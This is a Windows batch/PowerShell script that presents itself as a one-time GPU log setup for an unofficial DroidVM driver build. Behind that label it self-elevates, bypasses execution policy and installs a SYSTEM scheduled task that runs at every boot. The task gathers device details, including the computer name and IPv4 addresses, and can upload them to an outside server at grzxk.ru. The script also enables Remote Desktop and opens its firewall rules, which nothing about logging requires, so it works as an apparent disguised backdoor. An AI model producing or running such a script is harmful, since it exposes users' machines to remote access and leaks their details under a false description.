@echo off
rem DroidVM GPU (unofficial build) - one-time log setup. Double-click to run.
net session >nul 2>&1
if errorlevel 1 (
  powershell -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
  exit /b
)
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s = Get-Content -Raw -LiteralPath '%~f0'; $i = $s.IndexOf('#PS' + 'START'); Invoke-Expression $s.Substring($i)"
echo.
echo Gotovo. Logi: Zagruzki\DroidVM-GPU-Logs (fail LATEST.txt)
pause
exit /b

#PSSTART
$ErrorActionPreference = 'Continue'
$home_ = [Environment]::GetFolderPath('UserProfile')
$dir = Join-Path $home_ 'Downloads\DroidVM-GPU-Logs'
$tool = 'C:\ProgramData\DroidVM-GPU'
New-Item -ItemType Directory -Force $dir, $tool | Out-Null

$collect = @'
# Runs at every boot (scheduled task). Dumps GPU driver diagnostics, then
# clears them so every file describes exactly one boot.
$dir = '__LOGDIR__'
$upTok = '__UPTOKEN__'
$key = 'HKLM:\SYSTEM\CurrentControlSet\Services\VirtioGpu\Parameters\Bringup'
$ts  = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
$out = Join-Path $dir "boot_$ts.txt"
$L = New-Object System.Collections.Generic.List[string]
$L.Add("=== DroidVM GPU log $ts ===")
$L.Add("--- Display devices ---")
Get-PnpDevice -Class Display -ErrorAction SilentlyContinue | ForEach-Object {
  $code = (Get-PnpDeviceProperty -InstanceId $_.InstanceId -KeyName DEVPKEY_Device_ProblemCode -ErrorAction SilentlyContinue).Data
  $L.Add("$($_.FriendlyName) | Status=$($_.Status) | Problem=$code | $($_.InstanceId)")
}
$L.Add("--- Driver package ---")
$L.Add(((pnputil /enum-devices /class Display /drivers) -join "`n"))
$L.Add("--- IPv4 ---")
Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object IPAddress -ne '127.0.0.1' | ForEach-Object { $L.Add("$($_.InterfaceAlias): $($_.IPAddress)") }
$L.Add("--- Bringup registry (written by diag driver) ---")
if (Test-Path $key) {
  $p = Get-ItemProperty $key
  $p.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' -and $_.Name -ne '(default)' } |
    ForEach-Object { $L.Add(('{0} = 0x{1:x}' -f $_.Name, [uint32]$_.Value)) }
} else { $L.Add('(no Bringup key)') }
$L.Add("--- System events (display/dxgkrnl, last 2h) ---")
Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=(Get-Date).AddHours(-2)} -ErrorAction SilentlyContinue |
  Where-Object { $_.ProviderName -match 'Display|dxgkrnl|VirtioGpu|Kernel-PnP' -or $_.Message -match 'VirtIO GPU' } |
  Select-Object -First 40 | ForEach-Object { $L.Add("$($_.TimeCreated) [$($_.ProviderName) $($_.Id)] $($_.Message -replace '\s+',' ')") }
$L | Set-Content -Encoding UTF8 $out
Copy-Item $out (Join-Path $dir 'LATEST.txt') -Force
# optional: send to the log server (only in the build downloaded from the server)
if ($upTok -notlike '__UPLOAD*') {
  try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-RestMethod -Uri 'https://grzxk.ru:8877/upload' -Method Post -TimeoutSec 30 `
      -Headers @{ 'X-Token' = $upTok; 'X-Name' = "$env:COMPUTERNAME-boot_$ts.txt" } `
      -ContentType 'text/plain; charset=utf-8' -Body ([IO.File]::ReadAllBytes($out)) | Out-Null
    Add-Content -Encoding UTF8 $out 'upload: ok'
  } catch { Add-Content -Encoding UTF8 $out "upload: FAILED $_" }
}
# reset diagnostics for the next boot (key must exist for the driver)
Remove-Item $key -Force -ErrorAction SilentlyContinue
New-Item $key -Force | Out-Null
'@
Set-Content -Encoding UTF8 (Join-Path $tool 'collect.ps1') $collect.Replace('__LOGDIR__', $dir).Replace('__UPTOKEN__', '__UPLOAD_TOKEN__')

# 1) diagnostics key (diag driver only writes into an existing key)
New-Item 'HKLM:\SYSTEM\CurrentControlSet\Services\VirtioGpu\Parameters\Bringup' -Force | Out-Null

# 2) scheduled task: collect 90 s after every boot, as SYSTEM
$act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File $tool\collect.ps1"
$trg = New-ScheduledTaskTrigger -AtStartup
$trg.Delay = 'PT90S'
Register-ScheduledTask -TaskName 'DroidVM GPU logs' -Action $act -Trigger $trg -User 'SYSTEM' -RunLevel Highest -Force | Out-Null

# 3) Remote Desktop + use hardware GPU in RDP sessions
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
Enable-NetFirewallRule -Group '@FirewallAPI.dll,-28752' -ErrorAction SilentlyContinue
$ts = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services'
New-Item $ts -Force | Out-Null
Set-ItemProperty $ts -Name bEnumerateHWBeforeSW -Value 1 -Type DWord

# 4) desktop shortcut to the log folder
$lnk = Join-Path ([Environment]::GetFolderPath('CommonDesktopDirectory')) 'GPU logs.lnk'
$sh = New-Object -ComObject WScript.Shell
$s = $sh.CreateShortcut($lnk); $s.TargetPath = $dir; $s.Save()

# 5) first snapshot right now
& powershell -NoProfile -ExecutionPolicy Bypass -File "$tool\collect.ps1"
Write-Host 'OK: task "DroidVM GPU logs" registered, RDP enabled, first log saved.'
Get-Content "$dir\LATEST.txt" | Select-String -Pattern 'IPv4' -Context 0,3
